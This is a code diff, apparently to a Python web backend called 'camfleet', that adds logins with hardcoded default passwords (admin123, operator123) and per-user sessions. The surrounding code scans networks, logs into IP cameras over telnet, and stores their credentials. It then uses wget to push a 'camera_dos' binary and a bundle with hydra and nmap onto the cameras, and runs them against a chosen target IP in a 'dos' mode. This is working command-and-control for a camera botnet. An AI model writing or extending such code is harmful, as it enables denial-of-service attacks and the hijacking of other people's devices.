@@ -181,9 +181,6 @@ class Hub:
                 self.remove(c)
 
 
-HUB = Hub()
-
-
 # ------------------------------------------------------------- nmap parsing
 def classify(line):
     l = line.strip()
@@ -438,9 +435,6 @@ class TelnetPool:
         return sess.run_cmd(cmd, timeout)
 
 
-POOL = TelnetPool()
-
-
 # ------------------------------------------------------------ file server
 def start_file_server():
     """Start HTTP server on FILE_PORT to serve binaries/ for camera wget."""
@@ -539,7 +533,9 @@ def hydra_file_commands(files, marker):
 
 # ------------------------------------------------------------ engine
 class Engine:
-    def __init__(self):
+    def __init__(self, pool, hub):
+        self.pool = pool
+        self.hub = hub
         self.scan_state = "idle"
         self.scan_proc = None
         self.scan_stop = False
@@ -548,18 +544,18 @@ class Engine:
         self.exec_procs = {}
 
     def _emit_log(self, module, level, text):
-        HUB.broadcast({"type": "log", "ts": int(time.time()), "module": module,
+        self.hub.broadcast({"type": "log", "ts": int(time.time()), "module": module,
                        "level": level, "text": text})
 
     def _emit_result(self, module, data):
-        HUB.broadcast({"type": "result", "ts": int(time.time()), "module": module, "data": data})
+        self.hub.broadcast({"type": "result", "ts": int(time.time()), "module": module, "data": data})
         audit({"dir": "out", "type": "result", "module": module, "data": data})
 
     def _emit_status(self, module, state, summary=None):
         msg = {"type": "status", "ts": int(time.time()), "module": module, "state": state}
         if summary is not None:
             msg["summary"] = summary
-        HUB.broadcast(msg)
+        self.hub.broadcast(msg)
 
     # -- scan IP -------------------------------------------------------
     def scan_start(self, scan_range):
@@ -635,7 +631,7 @@ class Engine:
             user = cam.get("username", "root")
             pw = cam.get("password", "")
             self._emit_log("connect", "info", f"Đang kết nối {ip}…")
-            ok, msg = POOL.connect(ip, user, pw)
+            ok, msg = self.pool.connect(ip, user, pw)
             if ok:
                 self._emit_log("connect", "ok", f"✓ {ip} — kết nối thành công")
                 cred_save({"ip": ip, "username": user, "password": pw,
@@ -658,24 +654,24 @@ class Engine:
         return 200, {"accepted": True, "results": results}
 
     def disconnect_camera(self, ip):
-        ok = POOL.disconnect(ip)
+        ok = self.pool.disconnect(ip)
         if ok:
             self._emit_log("connect", "info", f"Đã ngắt {ip}")
         return 200, {"accepted": True, "disconnected": ok}
 
     def disconnect_all(self):
-        POOL.disconnect_all()
+        self.pool.disconnect_all()
         self._emit_log("connect", "info", "Đã ngắt tất cả")
         return 200, {"accepted": True}
 
     # -- check binary --------------------------------------------------
     def check_binary(self, ips=None):
         if ips is None:
-            ips = POOL.connected_ips()
+            ips = self.pool.connected_ips()
         results = []
 
         def _check_one(ip):
-            ok, output = POOL.run_cmd(ip, "ls -la /tmp/camera_dos 2>/dev/null")
+            ok, output = self.pool.run_cmd(ip, "ls -la /tmp/camera_dos 2>/dev/null")
             exists = ok and "camera_dos" in output and "No such file" not in output
             size = ""
             if exists:
@@ -684,7 +680,7 @@ class Engine:
                     if p.isdigit() and int(p) > 100:
                         size = p
                         break
-            ok2, out2 = POOL.run_cmd(ip, "ls -la /tmp/camera-tools/cam-run 2>&1")
+            ok2, out2 = self.pool.run_cmd(ip, "ls -la /tmp/camera-tools/cam-run 2>&1")
             tools_exists = ok2 and "cam-run" in out2 and "No such" not in (out2 or "")
             tools_size = ""
             if tools_exists:
@@ -710,7 +706,7 @@ class Engine:
     # -- deploy binary -------------------------------------------------
     def deploy_binary(self, ips=None, filename="camera_dos"):
         if ips is None:
-            ips = POOL.connected_ips()
+            ips = self.pool.connected_ips()
 
         filepath = os.path.join(BINDIR, filename)
         if not os.path.exists(filepath):
@@ -722,12 +718,12 @@ class Engine:
 
         def _deploy_one(ip):
             self._emit_log("deploy", "info", f"[{ip}] wget {url} → /tmp/{filename}")
-            ok, out = POOL.run_cmd(ip, f"wget -q {url} -O /tmp/{filename}", timeout=30)
+            ok, out = self.pool.run_cmd(ip, f"wget -q {url} -O /tmp/{filename}", timeout=30)
             if not ok:
                 self._emit_log("deploy", "error", f"[{ip}] wget thất bại: {out}")
                 results.append({"ip": ip, "ok": False, "msg": out})
                 return
-            ok2, out2 = POOL.run_cmd(ip, f"chmod +x /tmp/{filename}")
+            ok2, out2 = self.pool.run_cmd(ip, f"chmod +x /tmp/{filename}")
             if ok2:
                 self._emit_log("deploy", "ok", f"[{ip}] ✓ Deploy thành công")
                 results.append({"ip": ip, "ok": True, "msg": "OK"})
@@ -751,11 +747,11 @@ class Engine:
     # -- delete binary -------------------------------------------------
     def delete_binary(self, ips=None, filename="camera_dos"):
         if ips is None:
-            ips = POOL.connected_ips()
+            ips = self.pool.connected_ips()
         results = []
 
         def _delete_one(ip):
-            ok, out = POOL.run_cmd(ip, f"rm -f /tmp/{filename}")
+            ok, out = self.pool.run_cmd(ip, f"rm -f /tmp/{filename}")
             if ok:
                 self._emit_log("deploy", "ok", f"[{ip}] ✓ Đã xóa /tmp/{filename}")
                 results.append({"ip": ip, "ok": True, "msg": "OK"})
@@ -777,7 +773,7 @@ class Engine:
     # -- deploy camera-tools (tar.gz) ------------------------------------
     def deploy_tools(self, ips=None):
         if ips is None:
-            ips = POOL.connected_ips()
+            ips = self.pool.connected_ips()
 
         filepath = os.path.join(BINDIR, "camera-tools.tar.gz")
         if not os.path.exists(filepath):
@@ -790,23 +786,23 @@ class Engine:
         def _deploy_one(ip):
             tar_url = url.replace(".tar.gz", ".tar")
             self._emit_log("deploy", "info", f"[{ip}] Dọn dẹp /tmp…")
-            POOL.run_cmd(ip, "rm -rf /tmp/camera-tools /tmp/camera-tools.tar /tmp/camera-tools.tar.gz", timeout=10)
+            self.pool.run_cmd(ip, "rm -rf /tmp/camera-tools /tmp/camera-tools.tar /tmp/camera-tools.tar.gz", timeout=10)
             # Stream extract: wget pipe to tar — never stores archive on disk
             self._emit_log("deploy", "info", f"[{ip}] Tải + giải nén camera-tools (stream)…")
-            ok, out = POOL.run_cmd(ip, f"cd /tmp && wget -q {tar_url} -O - | tar xf -", timeout=120)
-            _, chk = POOL.run_cmd(ip, "ls /tmp/camera-tools/cam-run 2>&1")
+            ok, out = self.pool.run_cmd(ip, f"cd /tmp && wget -q {tar_url} -O - | tar xf -", timeout=120)
+            _, chk = self.pool.run_cmd(ip, "ls /tmp/camera-tools/cam-run 2>&1")
             extracted = "cam-run" in (chk or "") and "No such" not in (chk or "")
             if not extracted:
                 # Fallback: download then extract
                 self._emit_log("deploy", "info", f"[{ip}] Stream thất bại, thử tải file…")
-                POOL.run_cmd(ip, "rm -rf /tmp/camera-tools", timeout=5)
-                POOL.run_cmd(ip, f"cd /tmp && wget -q {tar_url} -O camera-tools.tar", timeout=120)
-                POOL.run_cmd(ip, "cd /tmp && tar xf camera-tools.tar 2>&1", timeout=60)
-                POOL.run_cmd(ip, "rm -f /tmp/camera-tools.tar", timeout=5)
-                _, chk = POOL.run_cmd(ip, "ls /tmp/camera-tools/cam-run 2>&1")
+                self.pool.run_cmd(ip, "rm -rf /tmp/camera-tools", timeout=5)
+                self.pool.run_cmd(ip, f"cd /tmp && wget -q {tar_url} -O camera-tools.tar", timeout=120)
+                self.pool.run_cmd(ip, "cd /tmp && tar xf camera-tools.tar 2>&1", timeout=60)
+                self.pool.run_cmd(ip, "rm -f /tmp/camera-tools.tar", timeout=5)
+                _, chk = self.pool.run_cmd(ip, "ls /tmp/camera-tools/cam-run 2>&1")
                 extracted = "cam-run" in (chk or "") and "No such" not in (chk or "")
             if extracted:
-                POOL.run_cmd(ip, "chmod +x /tmp/camera-tools/cam-run /tmp/camera-tools/bin/* 2>/dev/null", timeout=10)
+                self.pool.run_cmd(ip, "chmod +x /tmp/camera-tools/cam-run /tmp/camera-tools/bin/* 2>/dev/null", timeout=10)
                 self._emit_log("deploy", "ok", f"[{ip}] ✓ Deploy camera-tools thành công")
                 results.append({"ip": ip, "ok": True, "msg": "OK"})
             else:
@@ -829,11 +825,11 @@ class Engine:
     # -- delete camera-tools ---------------------------------------------
     def delete_tools(self, ips=None):
         if ips is None:
-            ips = POOL.connected_ips()
+            ips = self.pool.connected_ips()
         results = []
 
         def _delete_one(ip):
-            ok, out = POOL.run_cmd(ip, "rm -rf /tmp/camera-tools /tmp/camera-tools.tar.gz")
+            ok, out = self.pool.run_cmd(ip, "rm -rf /tmp/camera-tools /tmp/camera-tools.tar.gz")
             if ok:
                 self._emit_log("deploy", "ok", f"[{ip}] ✓ Đã xóa camera-tools")
                 results.append({"ip": ip, "ok": True, "msg": "OK"})
@@ -866,7 +862,7 @@ class Engine:
             for ip in ips:
                 marker = "HYDRA_READY_" + uuid.uuid4().hex
                 for step, command in enumerate(hydra_file_commands(files, marker)):
-                    ok, output = POOL.run_cmd(ip, command, timeout=20)
+                    ok, output = self.pool.run_cmd(ip, command, timeout=20)
                     if not ok or marker not in [line.strip() for line in output.splitlines()]:
                         if not ok:
                             message = f"[{ip}] Không gửi được lệnh chuẩn bị file: {output}"
@@ -892,9 +888,9 @@ class Engine:
 
         def _exec_one(ip):
             self._emit_log("exec", "warn", f"[{ip}] $ {cmd}")
-            ok, out = POOL.run_cmd(ip, bg_cmd, timeout=10)
+            ok, out = self.pool.run_cmd(ip, bg_cmd, timeout=10)
             logfile = "/tmp/camdos.log" if mode == "dos" else "/tmp/camtools.log"
-            POOL.run_cmd(ip, f"sleep 2 && head -10 {logfile}", timeout=8)
+            self.pool.run_cmd(ip, f"sleep 2 && head -10 {logfile}", timeout=8)
             results.append({"ip": ip, "ok": ok, "msg": out[:500]})
 
         threads = []
@@ -942,7 +938,7 @@ class Engine:
             elapsed = int(time.time() - self._exec_start_time)
             for ip in list(self._exec_monitor_ips):
                 try:
-                    ok, out = POOL.run_cmd(ip, "tail -20 /tmp/camdos.log 2>/dev/null", timeout=5)
+                    ok, out = self.pool.run_cmd(ip, "tail -20 /tmp/camdos.log 2>/dev/null", timeout=5)
                     if not ok or not out.strip():
                         cam_data[ip] = {"status": "waiting", "elapsed": elapsed}
                         continue
@@ -1008,7 +1004,7 @@ class Engine:
                 except Exception:
                     cam_data[ip] = {"status": "error", "elapsed": elapsed}
 
-            HUB.broadcast({"type": "exec_monitor", "data": cam_data})
+            self.hub.broadcast({"type": "exec_monitor", "data": cam_data})
 
     def _start_tools_monitor(self, ips):
         self._tools_monitor_stop = False
@@ -1026,7 +1022,7 @@ class Engine:
                 break
             for ip in list(self._tools_monitor_ips):
                 try:
-                    ok, out = POOL.run_cmd(ip, "tail -10 /tmp/camtools.log 2>/dev/null", timeout=5)
+                    ok, out = self.pool.run_cmd(ip, "tail -10 /tmp/camtools.log 2>/dev/null", timeout=5)
                     if ok and out.strip():
                         last = out.strip().split("\n")[-1]
                         if last:
@@ -1036,11 +1032,11 @@ class Engine:
 
     def exec_stop(self, ips=None, mode="dos"):
         if ips is None:
-            ips = POOL.connected_ips()
+            ips = self.pool.connected_ips()
         self._exec_monitor_stop = True
         self._tools_monitor_stop = True
         for ip in ips:
-            POOL.run_cmd(ip, "killall camera_dos cam-run fping nmap hydra 2>/dev/null", timeout=5)
+            self.pool.run_cmd(ip, "killall camera_dos cam-run fping nmap hydra 2>/dev/null", timeout=5)
             self._emit_log("exec", "info", f"[{ip}] killall camera_dos cam-run fping nmap hydra")
         return 200, {"accepted": True}
 
@@ -1048,14 +1044,63 @@ class Engine:
     def snapshot(self):
         return {
             "scan": {"state": self.scan_state},
-            "cameras": POOL.status(),
-            "connected_count": len(POOL.connected_ips()),
+            "cameras": self.pool.status(),
+            "connected_count": len(self.pool.connected_ips()),
             "host_ip": detect_host_ip(),
             "binaries": os.listdir(BINDIR) if os.path.isdir(BINDIR) else [],
         }
 
 
-ENGINE = Engine()
+# --------------------------------------------------------- users & sessions
+USERS_FILE = os.path.join(DATADIR, "users.json")
+
+
+def _load_users():
+    if os.path.exists(USERS_FILE):
+        with open(USERS_FILE, "r", encoding="utf-8") as f:
+            return json.load(f)
+    default = {"admin": "admin123", "operator": "operator123"}
+    with open(USERS_FILE, "w", encoding="utf-8") as f:
+        json.dump(default, f, indent=2, ensure_ascii=False)
+    return default
+
+
+USERS = _load_users()
+_sessions = {}
+_sessions_lock = threading.Lock()
+
+
+def session_create(username):
+    token = uuid.uuid4().hex
+    with _sessions_lock:
+        _sessions[token] = username
+    return token
+
+
+def session_check(token):
+    if not token:
+        return None
+    with _sessions_lock:
+        return _sessions.get(token)
+
+
+def session_delete(token):
+    with _sessions_lock:
+        _sessions.pop(token, None)
+
+
+_user_state = {}
+_user_state_lock = threading.Lock()
+
+
+def get_user_state(username):
+    with _user_state_lock:
+        if username not in _user_state:
+            pool = TelnetPool()
+            hub = Hub()
+            engine = Engine(pool, hub)
+            _user_state[username] = {"engine": engine, "pool": pool, "hub": hub}
+        return _user_state[username]
 
 
 # ------------------------------------------------------------------ HTTP
@@ -1092,96 +1137,171 @@ class Handler(SimpleHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(data)
 
+    # -- auth helpers --------------------------------------------------
+    def _get_token(self):
+        cookie = self.headers.get("Cookie", "")
+        for part in cookie.split(";"):
+            part = part.strip()
+            if part.startswith("session="):
+                return part[len("session="):]
+        return None
+
+    def _get_user(self):
+        return session_check(self._get_token())
+
+    def _auth(self):
+        username = self._get_user()
+        if not username:
+            self._json(401, {"error": "Chưa đăng nhập"})
+            return None
+        return get_user_state(username), username
+
     # -- routing -------------------------------------------------------
     def do_GET(self):
         path = urlparse(self.path).path
         if path == "/api/health":
             return self._json(200, {"status": "ok", "uptime_s": int(time.time() - START_TS),
                                     "pexpect": pexpect is not None})
+        if path == "/api/me":
+            u = self._get_user()
+            if not u:
+                return self._json(401, {"error": "Chưa đăng nhập"})
+            return self._json(200, {"username": u})
+
         if path == "/api/status":
-            return self._json(200, ENGINE.snapshot())
+            r = self._auth()
+            if not r:
+                return
+            st, _ = r
+            return self._json(200, st["engine"].snapshot())
+
         if path == "/api/stream":
             if self.headers.get("Upgrade", "").lower() == "websocket":
                 return self._ws()
             return self._json(400, {"error": "expected websocket upgrade"})
+
         if path == "/api/credentials":
+            if not self._get_user():
+                return self._json(401, {"error": "Chưa đăng nhập"})
             return self._json(200, {"credentials": cred_list()})
+
         if path == "/api/cameras":
-            return self._json(200, {"cameras": POOL.status(),
-                                    "connected": POOL.connected_ips()})
+            r = self._auth()
+            if not r:
+                return
+            st, _ = r
+            return self._json(200, {"cameras": st["pool"].status(),
+                                    "connected": st["pool"].connected_ips()})
         return super().do_GET()
 
     def do_POST(self):
         path = urlparse(self.path).path
         body = self._body()
 
+        if path == "/api/login":
+            u = (body.get("username") or "").strip()
+            p = body.get("password", "")
+            if USERS.get(u) != p:
+                return self._json(401, {"error": "Sai tài khoản hoặc mật khẩu"})
+            token = session_create(u)
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json; charset=utf-8")
+            self.send_header("Set-Cookie", f"session={token}; Path=/; HttpOnly; SameSite=Strict")
+            data = json.dumps({"ok": True, "username": u}, ensure_ascii=False).encode("utf-8")
+            self.send_header("Content-Length", str(len(data)))
+            self.send_header("Cache-Control", "no-store")
+            self.end_headers()
+            self.wfile.write(data)
+            audit({"dir": "in", "type": "login", "username": u})
+            return
+
+        if path == "/api/logout":
+            token = self._get_token()
+            if token:
+                session_delete(token)
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json; charset=utf-8")
+            self.send_header("Set-Cookie", "session=; Path=/; HttpOnly; Max-Age=0")
+            data = b'{"ok":true}'
+            self.send_header("Content-Length", str(len(data)))
+            self.send_header("Cache-Control", "no-store")
+            self.end_headers()
+            self.wfile.write(data)
+            return
+
+        r = self._auth()
+        if not r:
+            return
+        st, username = r
+        engine = st["engine"]
+        pool = st["pool"]
+
         if path == "/api/scan/start":
             scan_range = (body.get("scan_range") or "").strip()
             if not valid_range(scan_range):
                 return self._json(400, {"error": "Dải IP không hợp lệ"})
-            code, resp = ENGINE.scan_start(scan_range)
+            code, resp = engine.scan_start(scan_range)
             return self._json(code, resp)
 
         if path == "/api/scan/stop":
-            code, resp = ENGINE.scan_stop_cmd()
+            code, resp = engine.scan_stop_cmd()
             return self._json(code, resp)
 
         if path == "/api/connect":
             cameras = body.get("cameras", [])
             if not cameras:
                 return self._json(400, {"error": "Chưa chọn camera"})
-            code, resp = ENGINE.connect_cameras(cameras)
+            code, resp = engine.connect_cameras(cameras)
             return self._json(code, resp)
 
         if path == "/api/disconnect":
             ip = (body.get("ip") or "").strip()
             if ip:
-                code, resp = ENGINE.disconnect_camera(ip)
+                code, resp = engine.disconnect_camera(ip)
             else:
-                code, resp = ENGINE.disconnect_all()
+                code, resp = engine.disconnect_all()
             return self._json(code, resp)
 
         if path == "/api/check-binary":
             ips = body.get("ips") or None
-            code, resp = ENGINE.check_binary(ips)
+            code, resp = engine.check_binary(ips)
             return self._json(code, resp)
 
         if path == "/api/deploy":
             ips = body.get("ips") or None
             filename = body.get("filename", "camera_dos")
-            code, resp = ENGINE.deploy_binary(ips, filename)
+            code, resp = engine.deploy_binary(ips, filename)
             return self._json(code, resp)
 
         if path == "/api/deploy-tools":
             ips = body.get("ips") or None
-            code, resp = ENGINE.deploy_tools(ips)
+            code, resp = engine.deploy_tools(ips)
             return self._json(code, resp)
-
 
         if path == "/api/delete-binary":
             ips = body.get("ips") or None
             filename = body.get("filename", "camera_dos")
-            code, resp = ENGINE.delete_binary(ips, filename)
+            code, resp = engine.delete_binary(ips, filename)
             return self._json(code, resp)
 
         if path == "/api/delete-tools":
             ips = body.get("ips") or None
-            code, resp = ENGINE.delete_tools(ips)
+            code, resp = engine.delete_tools(ips)
             return self._json(code, resp)
 
         if path == "/api/exec":
-            ips = body.get("ips") or POOL.connected_ips()
+            ips = body.get("ips") or pool.connected_ips()
             target_ip = (body.get("target_ip") or "").strip()
             args_str = (body.get("args") or "").strip()
             mode = (body.get("mode") or "dos").strip()
             if mode == "dos" and not target_ip:
                 return self._json(400, {"error": "Thiếu target_ip"})
-            code, resp = ENGINE.exec_binary(ips, target_ip, args_str, mode=mode)
+            code, resp = engine.exec_binary(ips, target_ip, args_str, mode=mode)
             return self._json(code, resp)
 
         if path == "/api/exec/stop":
             ips = body.get("ips") or None
-            code, resp = ENGINE.exec_stop(ips)
+            code, resp = engine.exec_stop(ips)
             return self._json(code, resp)
 
         if path == "/api/credentials":
@@ -1200,6 +1320,8 @@ class Handler(SimpleHTTPRequestHandler):
 
     def do_DELETE(self):
         path = urlparse(self.path).path
+        if not self._get_user():
+            return self._json(401, {"error": "Chưa đăng nhập"})
         m = re.match(r"^/api/credentials/(.+)$", path)
         if m:
             ip = m.group(1)
@@ -1209,6 +1331,12 @@ class Handler(SimpleHTTPRequestHandler):
 
     # -- websocket -----------------------------------------------------
     def _ws(self):
+        username = self._get_user()
+        if not username:
+            return self._json(401, {"error": "Chưa đăng nhập"})
+        st = get_user_state(username)
+        hub = st["hub"]
+
         key = self.headers.get("Sec-WebSocket-Key")
         if not key:
             return self._json(400, {"error": "missing Sec-WebSocket-Key"})
@@ -1220,14 +1348,14 @@ class Handler(SimpleHTTPRequestHandler):
         self.end_headers()
 
         client = WSClient(self.connection)
-        HUB.add(client)
+        hub.add(client)
         self.close_connection = True
         try:
             self._ws_loop(client)
         except Exception:
             pass
         finally:
-            HUB.remove(client)
+            hub.remove(client)
             client.close()
 
     def _ws_loop(self, client):
@@ -1259,13 +1387,16 @@ def main():
     httpd = ThreadingHTTPServer(("0.0.0.0", PORT), Handler)
     httpd.daemon_threads = True
     host_ip = detect_host_ip()
+    users_str = ", ".join(USERS.keys())
     print(f"[camfleet] backend on :{PORT}  host_ip={host_ip}", flush=True)
+    print(f"[camfleet] users: {users_str}", flush=True)
     print(f"[camfleet] frontend: http://{host_ip}:{PORT}", flush=True)
     print(f"[camfleet] file server: http://{host_ip}:{FILE_PORT}", flush=True)
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
-        POOL.disconnect_all()
+        for st in _user_state.values():
+            st["pool"].disconnect_all()
         print("\n[camfleet] shutdown", flush=True)
 
 
